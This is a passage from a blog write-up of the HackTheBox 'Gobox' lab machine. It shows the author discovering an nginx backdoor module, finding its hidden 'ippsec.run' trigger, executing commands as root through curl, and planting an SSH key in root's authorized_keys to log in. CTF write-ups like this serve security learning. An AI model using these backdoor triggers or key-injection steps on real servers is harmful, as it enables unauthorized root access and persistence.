</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root  <span class=m>664</span> Feb  <span class=m>4</span>  <span class=m>2019</span> uwsgi_params
</span></span></code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name &ldquo;backdoor&rdquo;!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/etc/nginx$ ls -l modules-enabled
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>48</span> Aug <span class=m>23</span> 20:50 50-backdoor.conf
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>61</span> Aug <span class=m>23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>60</span> Aug <span class=m>23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>48</span> Aug <span class=m>23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>50</span> Aug <span class=m>23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
</span></span></code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
</span></span><span class=line><span class=cl>load_module modules/ngx_http_execute_module.so
</span></span><span class=line><span class=cl>www-data@gobox:/etc/nginx$ find / -type f -name <span class=s2>&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
</span></span><span class=line><span class=cl>/usr/lib/nginx/modules/ngx_http_execute_module.so
</span></span><span class=line><span class=cl>www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
</span></span><span class=line><span class=cl>/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, BuildID<span class=o>[</span>sha1<span class=o>]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
</span></span></code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href=https://github.com/limithit/NginxExecute>NginxExecute</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «loot» «10.10.14.97»
</span></span><span class=line><span class=cl>$ strings ngx_http_execute_module.so <span class=p>|</span> grep <span class=s1>&#39;.c$&#39;</span>
</span></span><span class=line><span class=cl>ngx_pcalloc
</span></span><span class=line><span class=cl>__ctype_b_loc
</span></span><span class=line><span class=cl>realloc
</span></span><span class=line><span class=cl>malloc
</span></span><span class=line><span class=cl>ngxexecute_strncpy_alloc
</span></span><span class=line><span class=cl>ngxexecute_strcpy_alloc
</span></span><span class=line><span class=cl>~iHc
</span></span><span class=line><span class=cl>/home/ubuntu/NginxExecute//ngx_result.c
</span></span><span class=line><span class=cl>7src
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h4 id=nginx-backdoor>NGINX Backdoor<a class=anchor aria-hidden=true href=#nginx-backdoor>#</a></h4><p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/etc/nginx$ curl -v <span class=s2>&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
</span></span><span class=line><span class=cl>* Trying 127.0.0.1:8000...
</span></span><span class=line><span class=cl>* TCP_NODELAY <span class=nb>set</span>
</span></span><span class=line><span class=cl>* Connected to 127.0.0.1 <span class=o>(</span>127.0.0.1<span class=o>)</span> port <span class=m>8000</span> <span class=o>(</span><span class=c1>#0)</span>
</span></span><span class=line><span class=cl>&gt; GET /?system.run<span class=o>[</span>ifconfig<span class=o>]</span> HTTP/1.1
</span></span><span class=line><span class=cl>&gt; Host: 127.0.0.1:8000
</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.68.0
</span></span><span class=line><span class=cl>&gt; Accept: */*
</span></span><span class=line><span class=cl>&gt;
</span></span><span class=line><span class=cl>* Empty reply from server
</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host 127.0.0.1 left intact</span>
</span></span><span class=line><span class=cl>curl: <span class=o>(</span>52<span class=o>)</span> Empty reply from server
</span></span></code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «loot» «10.10.14.97»
</span></span><span class=line><span class=cl>$ strings ngx_http_execute_module.so <span class=p>|</span> grep <span class=s1>&#39;run&#39;</span>
</span></span><span class=line><span class=cl>ippsec.run
</span></span></code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/etc/nginx$ curl -g <span class=s2>&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
</span></span><span class=line><span class=cl>root
</span></span></code></pre></div><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p><p><div class=img-container><img src=imgs/image-20210908184311943.png alt=image-20210908184311943></div></p><p>So instead, I will inject my SSH public key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/etc/nginx$ <span class=nb>echo</span> <span class=s1>&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
</span></span><span class=line><span class=cl>www-data@gobox:/etc/nginx$ curl -g <span class=s2>&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
</span></span><span class=line><span class=cl>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
</span></span></code></pre></div><p>Now I can SSH login as root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «gobox» «10.10.14.97»
</span></span><span class=line><span class=cl>$ ssh root@10.10.11.113
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-81-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Wed <span class=m>08</span> Sep <span class=m>2021</span> 11:52:18 AM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:                      0.0
</span></span><span class=line><span class=cl>  Usage of /:                       37.1% of 9.72GB
</span></span><span class=line><span class=cl>  Memory usage:                     20%
</span></span><span class=line><span class=cl>  Swap usage:                       0%
</span></span><span class=line><span class=cl>  Processes:                        <span class=m>244</span>
</span></span><span class=line><span class=cl>  Users logged in:                  <span class=m>0</span>
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> br-bb21b8b9b286: 172.28.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> docker0:         172.17.0.1
</span></span><span class=line><span class=cl>  IPv4 address <span class=k>for</span> ens160:          10.10.11.113
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>0</span> updates can be applied immediately.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The list of available updates is more than a week old.
</span></span><span class=line><span class=cl>To check <span class=k>for</span> new updates run: sudo apt update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Thu Aug <span class=m>26</span> 23:56:12 <span class=m>2021</span>
</span></span><span class=line><span class=cl>root@gobox:~#
</span></span></code></pre></div><p>I can grab the root flag as well.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@gobox:~# ls -l
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root  <span class=m>536</span> Aug <span class=m>24</span> 20:33 iptables.sh
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> root root   <span class=m>33</span> Aug <span class=m>26</span> 21:10 root.txt
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root <span class=m>4096</span> Aug <span class=m>26</span> 21:26 snap
</span></span><span class=line><span class=cl>root@gobox:~# cat root.txt
</span></span><span class=line><span class=cl>81d35...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h2 id=explore>Explore<a class=anchor aria-hidden=true href=#explore>#</a></h2><h3 id=undetected-ports>Undetected ports<a class=anchor aria-hidden=true href=#undetected-ports>#</a></h3><p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@gobox:/opt$ netstat -tlpn
</span></span><span class=line><span class=cl><span class=o>(</span>Not all processes could be identified, non-owned process info
</span></span><span class=line><span class=cl> will not be shown, you would have to be root to see it all.<span class=o>)</span>
</span></span><span class=line><span class=cl>Active Internet connections <span class=o>(</span>only servers<span class=o>)</span>
</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::9000                 :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::9001                 :::*                    LISTEN      -
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> :::22                   :::*                    LISTEN
</span></span></code></pre></div><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@gobox:~# iptables -L
</span></span><span class=line><span class=cl>Chain INPUT <span class=o>(</span>policy ACCEPT<span class=o>)</span>
</span></span><span class=line><span class=cl>target     prot opt <span class=nb>source</span>               destination         
</span></span><span class=line><span class=cl>ACCEPT     all  --  localhost/8          anywhere            
</span></span><span class=line><span class=cl>ACCEPT     all  --  172.16.0.0/12        anywhere            
</span></span><span class=line><span class=cl>DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
</span></span><span class=line><span class=cl>DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
</span></span><span class=line><span class=cl>DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p><p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p><h3 id=gobox-request-routing>Gobox Request Routing<a class=anchor aria-hidden=true href=#gobox-request-routing>#</a></h3><p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p><p>Now, with root access obtained, I could understand what was happening, and there was a synchronization process between the host and the LocalStack container.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@gobox:~# cat /var/spool/incron/root 
</span></span><span class=line><span class=cl>/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
</span></span><span class=line><span class=cl>/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
</span></span></code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p><p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p><p><div class=img-container><img src=imgs/image-20210912193743912.png alt=image-20210912193743912></div></p><div class=post-references><h2>Reference</h2><ul><li><a href=https://www.onsecurity.io/blog/go-ssti-method-research/ target=_blank rel="noopener noreferrer">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/s3/>S3</a></li><li><a href=https://fahmifj.github.io/tags/aws/>AWS</a></li><li><a href=https://fahmifj.github.io/tags/localstack/>LocalStack</a></li><li><a href=https://fahmifj.github.io/tags/go/>Go</a></li><li><a href=https://fahmifj.github.io/tags/ssti/>SSTI</a></li><li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/nginx/>Nginx</a></li><li><a href=https://fahmifj.github.io/tags/backdoor/>Backdoor</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Gobox on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Gobox&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fgobox%2f&hashtags=Linux%2cS3%2cAWS%2cLocalStack%2cGo%2cSSTI%2cCode-review%2cWebshell%2cNginx%2cBackdoor"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Gobox on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fgobox%2f&title=HackTheBox%20-%20Gobox&summary=HackTheBox%20-%20Gobox&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fgobox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Gobox on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fgobox%2f&title=HackTheBox%20-%20Gobox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Gobox on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fgobox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Gobox on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Gobox%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fgobox%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Gobox on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Gobox&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fgobox%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>